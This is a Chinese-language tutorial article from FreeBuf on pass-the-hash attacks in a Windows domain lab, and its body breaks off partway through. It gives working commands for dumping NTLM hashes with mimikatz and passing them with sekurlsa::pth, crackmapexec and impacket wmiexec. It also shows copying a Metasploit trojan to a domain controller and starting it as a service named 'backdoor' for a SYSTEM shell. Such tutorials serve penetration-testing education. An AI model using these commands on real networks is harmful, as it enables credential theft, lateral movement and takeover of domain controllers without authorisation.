---
title: 浅谈哈希传递那些世人皆知的事
url: https://www.freebuf.com/articles/network/280976.html
source: FreeBuf网络安全行业门户
date: 2023-06-29
fetch_date: 2025-10-04T11:48:09.206440
---

# 浅谈哈希传递那些世人皆知的事

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

浅谈哈希传递那些世人皆知的事

* ![]()
* 关注

* [基础安全](https://www.freebuf.com/articles/network)

浅谈哈希传递那些世人皆知的事

2023-06-28 14:02:18

所属地 北京

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

![maxresdefault](https://image.3001.net/images/20210716/1626405632_60f0fb00531ab6f917ec4.jpg!small)

## 前言

Pass The Hash 即哈希传递攻击，简称 PTH，该攻击方法通过找到与账户相关的密码散列值 NTLM Hash 来进行攻击的。由于在 Windows 系统 NTLM 认证的 TYPE 3 消息计算 Response 的时候，客户端是使用用户的 NTLM Hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录或对访问资源的用户进行身份认证的时候，是不需要用户明文密码的，只需要用户 Hash。攻击者可以利用 NTLM HASH 直接远程登录目标主机或反弹 Shell。

在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域环境或工作组环境。

## 哈希传递攻击

下面，我们以下图所示的环境来具体演示哈希传递攻击（PTH）的方法。

![image-20210711143331900](https://image.3001.net/images/20210716/1626405632_60f0fb009fb6803a6138d.png!small)

如图中，右侧是一个内网环境，域名为whoamianony.org，有两台主要的机器：域成员主机 Windows 7 和域控制器 Windows Server 2012，其中攻击者已经拿下了内网中的 Windows 7，接下来我们尝试通过哈希传递的方法获取 Windows Server 2012 的控制权。

### 使用 Mimikatz 进行 PTH

下面演示哈希传递攻击的方法（需要管理员权限）：

首先，攻击者在Windows 7上面上传mimikatz，并用mimikatz抓取Hash：

```
privilege::debug
sekurlsa::logonpasswords
```

![image-20210711115055569](https://image.3001.net/images/20210716/1626405632_60f0fb00e67039bb1faa3.png!small)

如上图所示，成功抓取到域管理员的 NTLM Hash 为：ab89b1295e69d353dd7614c7a3a80cec

然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：

```
privilege::debug
sekurlsa::pth /user:administrator /domain:whoamianony /ntlm:ab89b1295e69d353dd7614c7a3a80cec
```

![image-20210711115402017](https://image.3001.net/images/20210716/1626405633_60f0fb012aeb6fb0ae7de.png!small)

成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：

![image-20210711115654372](https://image.3001.net/images/20210716/1626405633_60f0fb0164da188847593.png!small)

为了简洁，上述的操作可以用以下一句话命令代替：

```
mimikatz.exe privilege::debug "sekurlsa::pth /domain:whoamianony /user:administrator /ntlm:ab89b1295e69d353dd7614c7a3a80cec /run:cmd.exe"
```

此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。

生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：

```
copy shell.exe \\DC.whoamianony.org\c$    // 将 shell.exe 复制到域控主机上
```

![image-20210711123454537](https://image.3001.net/images/20210716/1626405633_60f0fb01ca007c7ecab0e.png!small)

```
sc \\DC.whoamianony.org create backdoor binpath= "c:\shell.exe"    // 在域控上创建服务启动木马
sc \\DC.whoamianony.org start backdoor     // 在域控上立即启动该服务
sc \\DC.whoamianony.org delete backdoor     // 在域控上立即删除该服务
```

![image-20210711122041394](https://image.3001.net/images/20210716/1626405634_60f0fb0237fbad87f64d7.png!small)

此时虽然显示 1053 错误，但是如下图所示，域控制器成功上线，并且还是 SYSTEM 权限：

![image-20210711123142055](https://image.3001.net/images/20210716/1626405634_60f0fb027e505437dfc74.png!small)

注意，哈希传递攻击要注意一下几点：

> dir命令后面要使用主机名，不能用 IP，否则报错
>
> 使用 mimikatz 进行哈希传递要具有本地管理员权限

### 使用 Crackmapexec 进行 PTH

该工具位于kali上面，其可以对C段主机批量进行PTH攻击。

下载地址：<https://github.com/byt3bl33d3r/CrackMapExec.git>

在kali上直接用apt-get就可以安装：

```
apt-get install crackmapexec
```

对内网主机进行PTH的命令如下：

```
crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x whoami
crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x ipconfig
```

> **IP：**可以是单个IP也可以是IP段
>
> **-u：**指定用户名
>
> **-H：**指定NTLM Hash
>
> **-d：**指定域
>
> **-x：**执行系统命令

如下图所示，成功在 DC 主机上执行命令：

![image-20210711123730400](https://image.3001.net/images/20210716/1626405636_60f0fb04af5b059c3bdd2.png!small)

![image-20210711123841440](https://image.3001.net/images/20210716/1626405637_60f0fb05e1b43c61eea82.png!small)

### 利用 wmiexec 进行 PTH

> 项目地址：<https://github.com/SecureAuthCorp/impacket>

这是 impacket 工具包里面的一个脚本，可以用来 PTH，同时可以走 socks4/5 代理，十分强大。

首先在攻击机上安装 Impacket 工具包：

```
git clone https://github.com/CoreSecurity/impacket.git
cd impacket/
pip install .
```

进入 examples 目录即可找到我们的 wmiexec.py，然后执行以下命令即可：

```
python wmiexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec whoamianony/administrator@192.168.93.129 "whoami"
# (proxychains4) python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@IP "命令"
```

### 使用 Metasploit 进行 PTH

经常使用的三个模块：

# 内网渗透 # 哈希传递 # 内网安全渗透测试 # 内网安全 # 内网安全攻防

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

前言

哈希传递攻击

* 使用 Mimikatz 进行 PTH
* 使用 Crackmapexec 进行 PTH
* 利用 wmiexec 进行 PTH
* 使用 Metasploit 进行 PTH
* 利用 PowerShell 进行 PTH

利用哈希传递登录 RDP 远程桌面

* 借助 Restricted Admin Mode 进行哈希传递登录 RDP
* 哈希传递攻击的预防

Ending......

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)